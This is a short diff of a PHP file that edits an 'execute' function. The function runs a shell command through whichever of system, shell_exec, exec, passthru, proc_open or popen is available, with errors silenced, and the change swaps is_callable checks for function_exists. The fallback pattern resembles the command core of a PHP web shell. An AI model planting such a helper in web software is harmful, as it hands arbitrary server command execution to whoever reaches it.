@@ -160,30 +160,30 @@ if(!function_exists('execute')){
 		$output = "";
 		$code = $code." 2>&1";
 
-		if(is_callable('system')){
+		if(function_exists('system')){
 			ob_start();
 			@system($code);
 			$output = ob_get_contents();
 			ob_end_clean();
 			if(!empty($output)) return $output;
 		}
-		elseif(is_callable('shell_exec')){
+		elseif(function_exists('shell_exec')){
 			$output = @shell_exec($code);
 			if(!empty($output)) return $output;
 		}
-		elseif(is_callable('exec')){
+		elseif(function_exists('exec')){
 			@exec($code,$res);
 			if(!empty($res)) foreach($res as $line) $output .= $line;
 			if(!empty($output)) return $output;
 		}
-		elseif(is_callable('passthru')){
+		elseif(function_exists('passthru')){
 			ob_start();
 			@passthru($code);
 			$output = ob_get_contents();
 			ob_end_clean();
 			if(!empty($output)) return $output;
 		}
-		elseif(is_callable('proc_open')){
+		elseif(function_exists('proc_open')){
 			$desc = array(
 				0 => array("pipe", "r"),
 				1 => array("pipe", "w"),
@@ -200,7 +200,7 @@ if(!function_exists('execute')){
 			@proc_close($proc);
 			if(!empty($output)) return $output;
 		}
-		elseif(is_callable('popen')){
+		elseif(function_exists('popen')){
 			$res = @popen($code, 'r');
 			if($res){
 				while(!feof($res)){
